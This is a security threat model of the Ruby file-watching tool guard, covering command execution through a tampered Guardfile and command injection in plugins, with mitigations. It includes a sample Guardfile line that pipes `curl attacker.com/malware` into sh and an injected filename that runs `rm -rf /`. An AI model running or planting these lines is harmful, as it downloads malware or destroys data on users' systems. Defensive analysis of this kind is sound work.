# Attack Surface Analysis for guard/guard

## Attack Surface: [Arbitrary Command Execution (via Guardfile/Plugins)](./attack_surfaces/arbitrary_command_execution__via_guardfileplugins_.md)

*   **Description:**  Execution of arbitrary operating system commands by an attacker through manipulation of the `Guardfile` or compromised Guard plugins. This is the most significant risk.
*   **How `guard` Contributes:** `guard`'s core function is to execute commands based on file system events.  This inherent capability is the primary attack vector.  `guard` *directly* executes the malicious commands.
*   **Example:**
    *   Attacker modifies the `Guardfile` to include: `guard 'shell' do; watch(/.*/) { `curl attacker.com/malware | sh` }; end`
    *   Any file change now downloads and executes malware.
*   **Impact:** Complete system compromise.  Attacker gains full control of the server with the privileges of the user running `guard`. Data theft, system destruction, and lateral movement are all possible.
*   **Risk Severity:** Critical
*   **Mitigation Strategies:**
    *   **Never run `guard` in production:** This is the most important mitigation. `guard` is a development tool only.
    *   **Strict File Permissions:**  Set the `Guardfile` and plugin directories to be readable and writable *only* by the intended user (and *not* world-writable).  Use `chmod` and `chown` appropriately.  Example: `chmod 600 Guardfile; chown devuser:devgroup Guardfile`
    *   **Run as Non-Root User:**  Create a dedicated, unprivileged user account specifically for development tasks, including running `guard`.  Never run `guard` as root.
    *   **Code Reviews:**  *All* changes to the `Guardfile` and custom plugins *must* be reviewed by another developer.  Look for any suspicious commands or insecure handling of file paths.
    *   **Principle of Least Privilege:**  Ensure that the user running `guard` has only the absolute minimum necessary permissions to perform its tasks.  Avoid granting unnecessary access to sensitive files or directories.
    *   **Sandboxing (Advanced):**  Consider running `guard` within a container (e.g., Docker) or a virtual machine to further isolate it from the host system. This adds a layer of defense even if the `Guardfile` is compromised.
    * **Avoid Shell Commands When Possible:** If a plugin can achieve its goal without using a shell command, prefer that approach. For example, use Ruby's built-in file manipulation functions instead of shelling out to `cp` or `mv`.

## Attack Surface: [Command Injection (via User Input in Plugins)](./attack_surfaces/command_injection__via_user_input_in_plugins_.md)

*   **Description:**  Injection of shell commands through user-supplied data that is improperly handled by a Guard plugin.
*   **How `guard` Contributes:** `guard` itself doesn't handle user input, but if a *plugin* does, and that plugin is poorly written, it can create a command injection vulnerability. `guard` is the mechanism that *directly* executes the vulnerable plugin, and thus the injected command.
*   **Example:**
    *   A custom Guard plugin takes a filename as input (perhaps indirectly from a web form) and uses it in a shell command: `guard 'my_plugin' do; watch(/.*/) { |m| `process_file #{m[:filename]}` }; end`
    *   An attacker provides a filename like: `"; rm -rf /; echo "`
    *   The resulting command becomes: `process_file "; rm -rf /; echo "` (executing the malicious command).
*   **Impact:**  Potentially complete system compromise, similar to other command execution vulnerabilities.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Input Sanitization and Validation:**  *Never* trust user input.  Rigorously sanitize and validate *all* input before using it in *any* shell command or system call.  Use whitelisting (allowing only known-good characters) rather than blacklisting (trying to block known-bad characters).
    *   **Parameterized Commands:**  If possible, use parameterized commands or libraries that are designed to prevent shell injection.  For example, if interacting with a database, use prepared statements.
    *   **Avoid Shell Commands:**  If the plugin's task can be accomplished without using shell commands, do so.  Use Ruby's built-in functions for file manipulation, network communication, etc.
    *   **Code Reviews:**  Thoroughly review any Guard plugin code that handles user input, paying close attention to how that input is used.

